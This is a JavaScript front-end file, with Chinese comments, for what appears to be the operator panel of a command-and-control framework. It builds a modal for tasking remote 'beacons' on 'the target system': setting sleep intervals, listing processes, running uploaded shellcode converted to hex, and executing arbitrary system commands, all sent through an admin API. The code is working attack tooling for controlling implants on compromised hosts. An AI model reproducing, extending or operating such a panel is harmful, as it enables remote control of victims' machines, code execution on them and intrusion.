// Beacon任务管理JavaScript
// 处理beacons.html中的复杂任务模态框

let currentBeaconUuid = null;

// 任务类型描述
const taskDescriptions = {
    'NULL': 'Keep the beacon in sleep mode without any action.',
    '0x1A': 'Set the beacon sleep interval in seconds.',
    '0x1B': 'Retrieve a list of running processes from the target system.',
    '0x1C': 'Execute shellcode on the target system.',
    '0x1D': 'Execute a system command on the target system.'
};

// 初始化任务模态框
function initializeTaskModal() {
    const taskTypeSelect = document.getElementById('taskType');
    const sleepTimeDiv = document.getElementById('sleepTimeDiv');
    const shellcodeDiv = document.getElementById('shellcodeDiv');
    const commandDiv = document.getElementById('commandDiv');
    const taskDescription = document.getElementById('taskDescription');
    const sendButton = document.getElementById('sendTask');
    const shellcodeFile = document.getElementById('shellcodeFile');
    const commandInput = document.getElementById('commandInput');

    if (!taskTypeSelect) return;

    // 任务类型变化处理
    taskTypeSelect.addEventListener('change', function() {
        const selectedType = this.value;

        // 隐藏所有条件字段
        if (sleepTimeDiv) sleepTimeDiv.style.display = 'none';
        if (shellcodeDiv) shellcodeDiv.style.display = 'none';
        if (commandDiv) commandDiv.style.display = 'none';

        // 显示相关字段
        if (selectedType === '0x1A' && sleepTimeDiv) {
            sleepTimeDiv.style.display = 'block';
        } else if (selectedType === '0x1C' && shellcodeDiv) {
            shellcodeDiv.style.display = 'block';
        } else if (selectedType === '0x1D' && commandDiv) {
            commandDiv.style.display = 'block';
        }

        // 更新描述
        if (taskDescription) {
            taskDescription.textContent = taskDescriptions[selectedType] || 'Select a task type to see its description.';
        }

        // 启用/禁用发送按钮
        if (sendButton) {
            sendButton.disabled = !selectedType;
        }

        // 清除验证
        this.classList.remove('is-invalid');
    });

    // 文件上传处理
    if (shellcodeFile) {
        shellcodeFile.addEventListener('change', function() {
            const file = this.files[0];
            const fileInfo = document.getElementById('fileInfo');

            if (file) {
                // 验证文件大小（4MB限制）
                if (file.size > 4 * 1024 * 1024) {
                    this.classList.add('is-invalid');
                    if (fileInfo) fileInfo.style.display = 'none';
                    showAlert('File size exceeds 4MB limit', 'danger');
                    return;
                }

                // 显示文件信息
                if (fileInfo) {
                    document.getElementById('fileName').textContent = file.name;
                    document.getElementById('fileSize').textContent = formatFileSize(file.size);
                    fileInfo.style.display = 'block';
                }

                this.classList.remove('is-invalid');
                this.classList.add('is-valid');
            } else {
                if (fileInfo) fileInfo.style.display = 'none';
                this.classList.remove('is-valid', 'is-invalid');
            }
        });
    }

    // 发送任务按钮处理
    if (sendButton) {
        sendButton.addEventListener('click', async function() {
            await sendTaskToBeacon();
        });
    }
}

// 显示任务模态框
function showTaskModal(uuid) {
    currentBeaconUuid = uuid;
    
    // 重置表单
    resetTaskForm();
    
    // 显示模态框
    const modal = new bootstrap.Modal(document.getElementById('taskModal'));
    modal.show();
}

// 重置任务表单
function resetTaskForm() {
    const form = document.getElementById('taskForm');
    if (form) {
        form.reset();
        form.classList.remove('was-validated');
    }

    // 隐藏所有条件字段
    const sleepTimeDiv = document.getElementById('sleepTimeDiv');
    const shellcodeDiv = document.getElementById('shellcodeDiv');
    const commandDiv = document.getElementById('commandDiv');
    const fileInfo = document.getElementById('fileInfo');

    if (sleepTimeDiv) sleepTimeDiv.style.display = 'none';
    if (shellcodeDiv) shellcodeDiv.style.display = 'none';
    if (commandDiv) commandDiv.style.display = 'none';
    if (fileInfo) fileInfo.style.display = 'none';

    // 重置描述
    const taskDescription = document.getElementById('taskDescription');
    if (taskDescription) {
        taskDescription.textContent = 'Select a task type to see its description.';
    }

    // 禁用发送按钮
    const sendButton = document.getElementById('sendTask');
    if (sendButton) {
        sendButton.disabled = true;
    }
}

// 发送任务到Beacon
async function sendTaskToBeacon() {
    if (!currentBeaconUuid) {
        showAlert('No beacon selected', 'danger');
        return;
    }

    const taskType = document.getElementById('taskType').value;
    if (!taskType) {
        showAlert('Please select a task type', 'warning');
        return;
    }

    let taskData = {
        type: taskType
    };

    try {
        // 根据任务类型处理数据
        if (taskType === '0x1A') {
            const sleepTime = document.getElementById('sleepTime').value;
            if (!sleepTime || sleepTime < 1 || sleepTime > 3600) {
                showAlert('Please enter a valid sleep time (1-3600 seconds)', 'warning');
                return;
            }
            taskData.data = `Sleep ${sleepTime}`;
        } else if (taskType === '0x1B') {
            taskData.data = 'ProcessList';
        } else if (taskType === '0x1C') {
            const file = document.getElementById('shellcodeFile').files[0];
            if (!file) {
                showAlert('Please select a shellcode file', 'warning');
                return;
            }
            
            // 读取文件并转换为hex
            const arrayBuffer = await file.arrayBuffer();
            const uint8Array = new Uint8Array(arrayBuffer);
            const hexString = Array.from(uint8Array)
                .map(byte => byte.toString(16).padStart(2, '0'))
                .join('');
            
            taskData.data = hexString;
        } else if (taskType === '0x1D') {
            const command = document.getElementById('commandInput').value.trim();
            if (!command) {
                showAlert('Please enter a command to execute', 'warning');
                return;
            }
            taskData.data = command;
        }

        // 发送任务
        const result = await apiCall(`${getApiPrefix()}/beacons/${currentBeaconUuid}/job`, {
            method: 'POST',
            body: JSON.stringify(taskData)
        });

        if (result && result.status === 'success') {
            showAlert('Task sent successfully', 'success');
            
            // 关闭模态框
            const modal = bootstrap.Modal.getInstance(document.getElementById('taskModal'));
            if (modal) modal.hide();
            
            // 刷新beacon列表
            if (typeof loadBeacons === 'function') {
                loadBeacons();
            }
        } else {
            showAlert('Failed to send task', 'danger');
        }
    } catch (error) {
        console.error('Error sending task:', error);
        showAlert('Error sending task: ' + error.message, 'danger');
    }
}

// 格式化文件大小
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// 显示警告消息
function showAlert(message, type = 'info') {
    // 创建警告元素
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
    alertDiv.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
    alertDiv.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    document.body.appendChild(alertDiv);
    
    // 自动移除
    setTimeout(() => {
        if (alertDiv.parentNode) {
            alertDiv.parentNode.removeChild(alertDiv);
        }
    }, 5000);
}

// API调用函数
async function apiCall(url, options = {}) {
    const token = localStorage.getItem('token');
    const defaultOptions = {
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
        }
    };
    
    const finalOptions = { ...defaultOptions, ...options };
    if (finalOptions.body && typeof finalOptions.body === 'object') {
        finalOptions.body = JSON.stringify(finalOptions.body);
    }
    
    const response = await fetch(url, finalOptions);
    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return await response.json();
}

// 获取API前缀
function getApiPrefix() {
    return '/websafe/admin/api';
}

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    initializeTaskModal();
});

// 导出函数供全局使用
window.showTaskModal = showTaskModal;
